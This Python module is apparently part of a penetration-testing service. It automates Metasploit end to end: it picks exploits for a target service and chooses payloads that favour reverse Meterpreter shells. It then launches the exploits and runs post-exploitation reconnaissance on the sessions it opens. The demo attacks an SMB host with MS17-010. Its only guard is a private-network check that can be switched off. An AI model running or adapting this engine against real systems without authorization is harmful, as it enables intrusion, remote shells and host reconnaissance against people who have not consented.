#!/usr/bin/env python3
"""
XORB PTaaS Metasploit Framework Integration
Production-ready exploitation engine with real Metasploit integration
"""

import asyncio
import json
import logging
import subprocess
import tempfile
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
import re

logger = logging.getLogger(__name__)

@dataclass
class ExploitTarget:
    """Target specification for exploitation"""
    host: str
    port: int
    service: str
    vulnerability: str
    os_type: str = "unknown"
    architecture: str = "x86"
    service_version: str = ""
    exploit_confidence: float = 0.7

@dataclass
class ExploitPayload:
    """Payload configuration for exploitation"""
    payload_type: str
    target_platform: str
    architecture: str
    options: Dict[str, Any]
    encoder: Optional[str] = None
    iterations: int = 1
    format: str = "raw"

@dataclass
class ExploitResult:
    """Result of exploitation attempt"""
    exploit_id: str
    target: ExploitTarget
    payload: ExploitPayload
    success: bool
    session_id: Optional[str]
    access_level: str
    execution_time: float
    evidence: List[str]
    error_message: Optional[str] = None
    post_exploitation_data: Dict[str, Any] = None

class MetasploitFramework:
    """Production Metasploit Framework integration"""

    def __init__(self, msf_path: str = "/usr/bin/msfconsole"):
        self.msf_path = msf_path
        self.msf_db_path = "/opt/metasploit-framework/embedded/framework/msfdb"
        self.workspace_name = "xorb_ptaas"
        self.session_timeout = 300  # 5 minutes
        self.max_concurrent_exploits = 5

        # Exploit database
        self.exploit_db = {}
        self.payload_db = {}
        self.active_sessions = {}

        # Safety constraints
        self.safe_mode = True
        self.allowed_networks = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
        self.blocked_networks = ["127.0.0.0/8", "169.254.0.0/16"]

    async def initialize(self) -> bool:
        """Initialize Metasploit Framework"""
        try:
            logger.info("Initializing Metasploit Framework integration...")

            # Check if Metasploit is installed
            if not await self._check_metasploit_installation():
                logger.error("Metasploit Framework not found")
                return False

            # Initialize database
            await self._initialize_database()

            # Load exploit and payload databases
            await self._load_exploit_database()
            await self._load_payload_database()

            # Create workspace
            await self._create_workspace()

            logger.info("Metasploit Framework initialized successfully")
            return True

        except Exception as e:
            logger.error(f"Failed to initialize Metasploit Framework: {e}")
            return False

    async def _check_metasploit_installation(self) -> bool:
        """Check if Metasploit is properly installed"""
        try:
            # Check if msfconsole exists
            if not Path(self.msf_path).exists():
                # Try alternative paths
                alternative_paths = [
                    "/usr/bin/msfconsole",
                    "/opt/metasploit-framework/msfconsole",
                    "/usr/local/bin/msfconsole"
                ]

                for path in alternative_paths:
                    if Path(path).exists():
                        self.msf_path = path
                        break
                else:
                    return False

            # Test msfconsole execution
            result = await self._run_msf_command("version")
            return result.get("success", False)

        except Exception as e:
            logger.error(f"Metasploit installation check failed: {e}")
            return False

    async def _initialize_database(self) -> bool:
        """Initialize Metasploit database"""
        try:
            # Check if database is running
            db_check = await self._run_msf_command("db_status")

            if not db_check.get("success", False):
                # Try to start database
                logger.info("Starting Metasploit database...")
                start_result = await asyncio.create_subprocess_exec(
                    self.msf_db_path, "init",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await start_result.communicate()

            # Verify database connection
            db_status = await self._run_msf_command("db_status")
            return db_status.get("success", False)

        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            return False

    async def _load_exploit_database(self):
        """Load available exploits from Metasploit"""
        try:
            logger.info("Loading exploit database...")

            # Get list of all exploits
            result = await self._run_msf_command("search type:exploit")

            if result.get("success", False):
                exploits = self._parse_search_results(result.get("output", ""))

                for exploit in exploits:
                    self.exploit_db[exploit["name"]] = {
                        "name": exploit["name"],
                        "disclosure_date": exploit.get("disclosure_date"),
                        "rank": exploit.get("rank", "normal"),
                        "description": exploit.get("description", ""),
                        "targets": exploit.get("targets", []),
                        "platforms": exploit.get("platforms", [])
                    }

                logger.info(f"Loaded {len(self.exploit_db)} exploits")

        except Exception as e:
            logger.error(f"Failed to load exploit database: {e}")

    async def _load_payload_database(self):
        """Load available payloads from Metasploit"""
        try:
            logger.info("Loading payload database...")

            # Get list of all payloads
            result = await self._run_msf_command("search type:payload")

            if result.get("success", False):
                payloads = self._parse_search_results(result.get("output", ""))

                for payload in payloads:
                    self.payload_db[payload["name"]] = {
                        "name": payload["name"],
                        "platform": payload.get("platform", ""),
                        "arch": payload.get("arch", ""),
                        "size": payload.get("size", 0),
                        "description": payload.get("description", "")
                    }

                logger.info(f"Loaded {len(self.payload_db)} payloads")

        except Exception as e:
            logger.error(f"Failed to load payload database: {e}")

    async def _create_workspace(self) -> bool:
        """Create dedicated workspace for XORB scans"""
        try:
            # Create workspace
            create_result = await self._run_msf_command(f"workspace -a {self.workspace_name}")

            # Switch to workspace
            switch_result = await self._run_msf_command(f"workspace {self.workspace_name}")

            return create_result.get("success", False) and switch_result.get("success", False)

        except Exception as e:
            logger.error(f"Failed to create workspace: {e}")
            return False

    async def _run_msf_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """Execute Metasploit command"""
        try:
            # Create resource file with command
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(f"{command}\nexit\n")
                resource_file = f.name

            # Execute msfconsole with resource file
            process = await asyncio.create_subprocess_exec(
                self.msf_path, "-q", "-r", resource_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            # Clean up resource file
            Path(resource_file).unlink(missing_ok=True)

            output = stdout.decode('utf-8', errors='ignore')
            error = stderr.decode('utf-8', errors='ignore')

            return {
                "success": process.returncode == 0,
                "output": output,
                "error": error,
                "return_code": process.returncode
            }

        except asyncio.TimeoutError:
            logger.error(f"Metasploit command timeout: {command}")
            return {"success": False, "error": "Command timeout"}
        except Exception as e:
            logger.error(f"Failed to execute MSF command '{command}': {e}")
            return {"success": False, "error": str(e)}

    def _parse_search_results(self, output: str) -> List[Dict[str, Any]]:
        """Parse Metasploit search results"""
        results = []

        try:
            lines = output.split('\n')
            for line in lines:
                if line.strip() and not line.startswith('=') and not line.startswith('#'):
                    # Parse search result line
                    parts = line.split()
                    if len(parts) >= 3:
                        result = {
                            "name": parts[0],
                            "disclosure_date": parts[1] if len(parts) > 1 else "",
                            "rank": parts[2] if len(parts) > 2 else "",
                            "description": ' '.join(parts[3:]) if len(parts) > 3 else ""
                        }
                        results.append(result)

        except Exception as e:
            logger.error(f"Failed to parse search results: {e}")

        return results

    async def find_suitable_exploits(self, target: ExploitTarget) -> List[Dict[str, Any]]:
        """Find suitable exploits for target"""
        try:
            suitable_exploits = []

            # Search for exploits matching the service
            search_terms = [
                target.service,
                f"{target.service} {target.service_version}",
                f"port:{target.port}",
                target.vulnerability
            ]

            for term in search_terms:
                if term:
                    result = await self._run_msf_command(f"search {term}")

                    if result.get("success", False):
                        exploits = self._parse_search_results(result.get("output", ""))

                        for exploit in exploits:
                            # Check if exploit is suitable for target
                            if self._is_exploit_suitable(exploit, target):
                                exploit_info = {
                                    **exploit,
                                    "compatibility_score": self._calculate_compatibility_score(exploit, target)
                                }
                                suitable_exploits.append(exploit_info)

            # Remove duplicates and sort by compatibility score
            unique_exploits = {exp["name"]: exp for exp in suitable_exploits}
            sorted_exploits = sorted(
                unique_exploits.values(),
                key=lambda x: x.get("compatibility_score", 0),
                reverse=True
            )

            return sorted_exploits[:10]  # Return top 10 exploits

        except Exception as e:
            logger.error(f"Failed to find suitable exploits: {e}")
            return []

    def _is_exploit_suitable(self, exploit: Dict[str, Any], target: ExploitTarget) -> bool:
        """Check if exploit is suitable for target"""
        try:
            # Check service match
            if target.service.lower() not in exploit.get("description", "").lower():
                return False

            # Check rank (avoid manual exploits in automated mode)
            rank = exploit.get("rank", "").lower()
            if rank in ["manual", "poor"]:
                return False

            # Check if it's a recent exploit (good rank)
            if rank in ["excellent", "great", "good"]:
                return True

            return True

        except Exception:
            return False

    def _calculate_compatibility_score(self, exploit: Dict[str, Any], target: ExploitTarget) -> float:
        """Calculate compatibility score between exploit and target"""
        score = 0.0

        try:
            # Rank-based scoring
            rank_scores = {
                "excellent": 1.0,
                "great": 0.9,
                "good": 0.8,
                "normal": 0.6,
                "average": 0.5,
                "low": 0.3,
                "poor": 0.1
            }

            rank = exploit.get("rank", "normal").lower()
            score += rank_scores.get(rank, 0.5)

            # Service name match
            description = exploit.get("description", "").lower()
            if target.service.lower() in description:
                score += 0.3

            # Version match
            if target.service_version and target.service_version in description:
                score += 0.2

            # Vulnerability name match
            if target.vulnerability.lower() in description:
                score += 0.4

            return min(score, 1.0)

        except Exception:
            return 0.5

    async def select_optimal_payload(self, target: ExploitTarget, exploit_name: str) -> Optional[ExploitPayload]:
        """Select optimal payload for target and exploit"""
        try:
            # Get compatible payloads for exploit
            result = await self._run_msf_command(f"use {exploit_name}; show payloads")

            if not result.get("success", False):
                return None

            # Parse available payloads
            payloads = self._parse_payload_list(result.get("output", ""))

            # Score and select best payload
            best_payload = None
            best_score = 0.0

            for payload in payloads:
                score = self._score_payload(payload, target)
                if score > best_score:
                    best_score = score
                    best_payload = payload

            if best_payload:
                return ExploitPayload(
                    payload_type=best_payload["name"],
                    target_platform=target.os_type,
                    architecture=target.architecture,
                    options=self._get_payload_options(best_payload, target)
                )

            return None

        except Exception as e:
            logger.error(f"Failed to select optimal payload: {e}")
            return None

    def _parse_payload_list(self, output: str) -> List[Dict[str, Any]]:
        """Parse payload list from Metasploit output"""
        payloads = []

        try:
            lines = output.split('\n')
            for line in lines:
                if 'payload' in line.lower() and '/' in line:
                    parts = line.strip().split()
                    if parts:
                        payload = {
                            "name": parts[0],
                            "description": ' '.join(parts[1:])
                        }
                        payloads.append(payload)

        except Exception as e:
            logger.error(f"Failed to parse payload list: {e}")

        return payloads

    def _score_payload(self, payload: Dict[str, Any], target: ExploitTarget) -> float:
        """Score payload suitability for target"""
        score = 0.5  # Base score

        try:
            payload_name = payload.get("name", "").lower()

            # Platform matching
            if target.os_type.lower() in payload_name:
                score += 0.3

            # Architecture matching
            if target.architecture.lower() in payload_name:
                score += 0.2

            # Prefer reverse shells for network access
            if "reverse" in payload_name:
                score += 0.3

            # Prefer meterpreter for advanced post-exploitation
            if "meterpreter" in payload_name:
                score += 0.4

            # Avoid staged payloads if possible (reliability)
            if "staged" not in payload_name:
                score += 0.1

            return min(score, 1.0)

        except Exception:
            return 0.5

    def _get_payload_options(self, payload: Dict[str, Any], target: ExploitTarget) -> Dict[str, Any]:
        """Get payload options for target"""
        options = {
            "LHOST": "0.0.0.0",  # Will be set by orchestrator
            "LPORT": 4444        # Default listener port
        }

        try:
            payload_name = payload.get("name", "").lower()

            # Set target-specific options
            if "reverse" in payload_name:
                options["LHOST"] = self._get_local_ip()
                options["LPORT"] = self._get_available_port()

            if "bind" in payload_name:
                options["RHOST"] = target.host
                options["RPORT"] = target.port

        except Exception as e:
            logger.error(f"Failed to get payload options: {e}")

        return options

    def _get_local_ip(self) -> str:
        """Get local IP address for reverse connections"""
        try:
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    def _get_available_port(self) -> int:
        """Get available port for listener"""
        try:
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('localhost', 0))
                return s.getsockname()[1]
        except Exception:
            return 4444

    async def execute_exploit(self, target: ExploitTarget, exploit_name: str, payload: ExploitPayload) -> ExploitResult:
        """Execute exploit against target"""
        try:
            # Safety check
            if not self._is_target_authorized(target):
                return ExploitResult(
                    exploit_id=f"exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                    target=target,
                    payload=payload,
                    success=False,
                    session_id=None,
                    access_level="none",
                    execution_time=0.0,
                    evidence=[],
                    error_message="Target not authorized for exploitation"
                )

            start_time = datetime.now()
            exploit_id = f"exploit_{start_time.strftime('%Y%m%d_%H%M%S')}_{target.host}_{target.port}"

            logger.info(f"Executing exploit {exploit_name} against {target.host}:{target.port}")

            # Build Metasploit resource script
            resource_script = self._build_exploit_script(target, exploit_name, payload)

            # Execute exploit
            result = await self._run_msf_command_from_script(resource_script)

            execution_time = (datetime.now() - start_time).total_seconds()

            # Parse exploitation results
            if result.get("success", False):
                session_info = self._parse_session_info(result.get("output", ""))

                if session_info:
                    exploit_result = ExploitResult(
                        exploit_id=exploit_id,
                        target=target,
                        payload=payload,
                        success=True,
                        session_id=session_info.get("session_id"),
                        access_level=session_info.get("access_level", "user"),
                        execution_time=execution_time,
                        evidence=session_info.get("evidence", []),
                        post_exploitation_data=session_info.get("post_data", {})
                    )

                    # Store active session
                    if session_info.get("session_id"):
                        self.active_sessions[session_info["session_id"]] = {
                            "target": target,
                            "created_at": start_time,
                            "exploit_id": exploit_id
                        }

                    return exploit_result

            # Exploitation failed
            return ExploitResult(
                exploit_id=exploit_id,
                target=target,
                payload=payload,
                success=False,
                session_id=None,
                access_level="none",
                execution_time=execution_time,
                evidence=[],
                error_message=result.get("error", "Unknown exploitation error")
            )

        except Exception as e:
            logger.error(f"Exploit execution failed: {e}")
            return ExploitResult(
                exploit_id=f"exploit_error_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                target=target,
                payload=payload,
                success=False,
                session_id=None,
                access_level="none",
                execution_time=0.0,
                evidence=[],
                error_message=str(e)
            )

    def _is_target_authorized(self, target: ExploitTarget) -> bool:
        """Check if target is authorized for exploitation"""
        try:
            import ipaddress

            target_ip = ipaddress.ip_address(target.host)

            # Check blocked networks
            for blocked_network in self.blocked_networks:
                if target_ip in ipaddress.ip_network(blocked_network):
                    return False

            # In safe mode, only allow private networks
            if self.safe_mode:
                for allowed_network in self.allowed_networks:
                    if target_ip in ipaddress.ip_network(allowed_network):
                        return True
                return False

            return True

        except Exception as e:
            logger.error(f"Authorization check failed: {e}")
            return False

    def _build_exploit_script(self, target: ExploitTarget, exploit_name: str, payload: ExploitPayload) -> str:
        """Build Metasploit resource script for exploitation"""
        script_lines = [
            f"workspace {self.workspace_name}",
            f"use {exploit_name}",
            f"set RHOSTS {target.host}",
            f"set RPORT {target.port}",
            f"set payload {payload.payload_type}"
        ]

        # Add payload options
        for option, value in payload.options.items():
            script_lines.append(f"set {option} {value}")

        # Set target if specified
        if target.os_type != "unknown":
            script_lines.append(f"set TARGET 0")  # Auto-select target

        # Execute exploit
        script_lines.extend([
            "exploit -j",  # Run as job
            "sleep 5",     # Wait for session
            "sessions -l", # List sessions
            "exit"
        ])

        return '\n'.join(script_lines)

    async def _run_msf_command_from_script(self, script: str, timeout: int = 120) -> Dict[str, Any]:
        """Execute Metasploit commands from script"""
        try:
            # Write script to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(script)
                script_file = f.name

            # Execute msfconsole with script
            process = await asyncio.create_subprocess_exec(
                self.msf_path, "-q", "-r", script_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            # Clean up script file
            Path(script_file).unlink(missing_ok=True)

            output = stdout.decode('utf-8', errors='ignore')
            error = stderr.decode('utf-8', errors='ignore')

            return {
                "success": process.returncode == 0,
                "output": output,
                "error": error,
                "return_code": process.returncode
            }

        except asyncio.TimeoutError:
            logger.error("Exploit execution timeout")
            return {"success": False, "error": "Execution timeout"}
        except Exception as e:
            logger.error(f"Failed to execute exploit script: {e}")
            return {"success": False, "error": str(e)}

    def _parse_session_info(self, output: str) -> Optional[Dict[str, Any]]:
        """Parse session information from Metasploit output"""
        try:
            session_info = None

            # Look for session creation indicators
            lines = output.split('\n')
            for line in lines:
                # Session opened
                if "session" in line.lower() and "opened" in line.lower():
                    # Extract session ID
                    session_match = re.search(r'session (\d+)', line)
                    if session_match:
                        session_id = session_match.group(1)

                        session_info = {
                            "session_id": session_id,
                            "access_level": "user",  # Default, will be determined later
                            "evidence": [f"Session {session_id} opened successfully"],
                            "post_data": {}
                        }

                # Meterpreter session
                if "meterpreter" in line.lower():
                    if session_info:
                        session_info["access_level"] = "meterpreter"
                        session_info["evidence"].append("Meterpreter session established")

                # Command shell
                if "command shell" in line.lower():
                    if session_info:
                        session_info["access_level"] = "shell"
                        session_info["evidence"].append("Command shell access gained")

            return session_info

        except Exception as e:
            logger.error(f"Failed to parse session info: {e}")
            return None

    async def post_exploitation(self, session_id: str) -> Dict[str, Any]:
        """Perform post-exploitation activities"""
        try:
            if session_id not in self.active_sessions:
                return {"error": "Session not found"}

            logger.info(f"Starting post-exploitation for session {session_id}")

            # Build post-exploitation script
            post_script = f"""
workspace {self.workspace_name}
sessions -i {session_id}
getuid
getpid
sysinfo
pwd
ls
ps
netstat
exit
"""

            # Execute post-exploitation commands
            result = await self._run_msf_command_from_script(post_script)

            if result.get("success", False):
                post_data = self._parse_post_exploitation_data(result.get("output", ""))
                return {
                    "success": True,
                    "session_id": session_id,
                    "data": post_data
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error", "Post-exploitation failed")
                }

        except Exception as e:
            logger.error(f"Post-exploitation failed: {e}")
            return {"success": False, "error": str(e)}

    def _parse_post_exploitation_data(self, output: str) -> Dict[str, Any]:
        """Parse post-exploitation command output"""
        data = {
            "user_info": "",
            "system_info": "",
            "process_info": "",
            "network_info": "",
            "files": [],
            "processes": []
        }

        try:
            lines = output.split('\n')
            current_section = None

            for line in lines:
                line = line.strip()

                # Identify sections
                if "getuid" in line.lower():
                    current_section = "user_info"
                elif "sysinfo" in line.lower():
                    current_section = "system_info"
                elif "netstat" in line.lower():
                    current_section = "network_info"
                elif "ls" in line.lower():
                    current_section = "files"
                elif "ps" in line.lower():
                    current_section = "processes"

                # Parse content based on section
                if current_section == "user_info" and line and "getuid" not in line:
                    data["user_info"] += line + "\n"
                elif current_section == "system_info" and line and "sysinfo" not in line:
                    data["system_info"] += line + "\n"
                elif current_section == "network_info" and line and "netstat" not in line:
                    data["network_info"] += line + "\n"
                elif current_section == "files" and line and not line.startswith("ls"):
                    data["files"].append(line)
                elif current_section == "processes" and line and not line.startswith("ps"):
                    data["processes"].append(line)

        except Exception as e:
            logger.error(f"Failed to parse post-exploitation data: {e}")

        return data

    async def cleanup_session(self, session_id: str) -> bool:
        """Clean up exploitation session"""
        try:
            if session_id in self.active_sessions:
                # Kill session
                result = await self._run_msf_command(f"sessions -k {session_id}")

                # Remove from active sessions
                del self.active_sessions[session_id]

                logger.info(f"Session {session_id} cleaned up")
                return result.get("success", False)

            return True

        except Exception as e:
            logger.error(f"Failed to cleanup session {session_id}: {e}")
            return False

    async def get_exploit_statistics(self) -> Dict[str, Any]:
        """Get exploitation statistics"""
        try:
            return {
                "available_exploits": len(self.exploit_db),
                "available_payloads": len(self.payload_db),
                "active_sessions": len(self.active_sessions),
                "framework_status": "initialized" if self.exploit_db else "not_initialized",
                "workspace": self.workspace_name,
                "safe_mode": self.safe_mode
            }

        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
            return {"error": str(e)}

# Global Metasploit instance
_metasploit_framework: Optional[MetasploitFramework] = None

async def get_metasploit_framework() -> MetasploitFramework:
    """Get global Metasploit framework instance"""
    global _metasploit_framework

    if _metasploit_framework is None:
        _metasploit_framework = MetasploitFramework()
        await _metasploit_framework.initialize()

    return _metasploit_framework

# Example usage
if __name__ == "__main__":
    async def demo_exploitation():
        msf = await get_metasploit_framework()

        # Example target
        target = ExploitTarget(
            host="192.168.1.100",
            port=445,
            service="smb",
            vulnerability="MS17-010",
            os_type="windows",
            architecture="x64"
        )

        # Find suitable exploits
        exploits = await msf.find_suitable_exploits(target)
        print(f"Found {len(exploits)} suitable exploits")

        if exploits:
            # Select best exploit
            best_exploit = exploits[0]
            print(f"Selected exploit: {best_exploit['name']}")

            # Get optimal payload
            payload = await msf.select_optimal_payload(target, best_exploit["name"])

            if payload:
                print(f"Selected payload: {payload.payload_type}")

                # Execute exploit
                result = await msf.execute_exploit(target, best_exploit["name"], payload)
                print(f"Exploitation result: {result.success}")

                if result.success and result.session_id:
                    # Post-exploitation
                    post_result = await msf.post_exploitation(result.session_id)
                    print(f"Post-exploitation: {post_result.get('success', False)}")

                    # Cleanup
                    await msf.cleanup_session(result.session_id)

    asyncio.run(demo_exploitation())
